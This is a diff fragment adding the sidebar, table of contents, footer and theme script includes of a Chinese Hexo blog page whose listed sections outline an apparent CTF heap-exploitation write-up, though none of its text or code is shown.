+              <p class="site-description motion-element" itemprop="description">什么都可以不会，但不能学不会。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">101</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">52</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                我大佬们
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://f1aming.github.io/" title="f1aming" target="_blank">f1aming</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.hunya.io/" title="昏鸦" target="_blank">昏鸦</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-一个图书管理"><span class="nav-number">1.</span> <span class="nav-text">0x01:一个图书管理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-程序漏洞"><span class="nav-number">2.</span> <span class="nav-text">0x02:程序漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-泄漏book1-struct的地址。"><span class="nav-number">3.</span> <span class="nav-text">0x03:泄漏book1_struct的地址。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-mmap"><span class="nav-number">4.</span> <span class="nav-text">0x04:mmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-构造fake-book1-0字节覆盖"><span class="nav-number">5.</span> <span class="nav-text">0x05:构造fake_book1  + 0字节覆盖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-leak-book2-name的地址（mmap的区域）"><span class="nav-number">6.</span> <span class="nav-text">0x06:leak book2_name的地址（mmap的区域）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-触发"><span class="nav-number">7.</span> <span class="nav-text">0x07 触发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08完整exp"><span class="nav-number">8.</span> <span class="nav-text">0x08完整exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x09"><span class="nav-number">9.</span> <span class="nav-text">0x09</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha2</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
+</html>
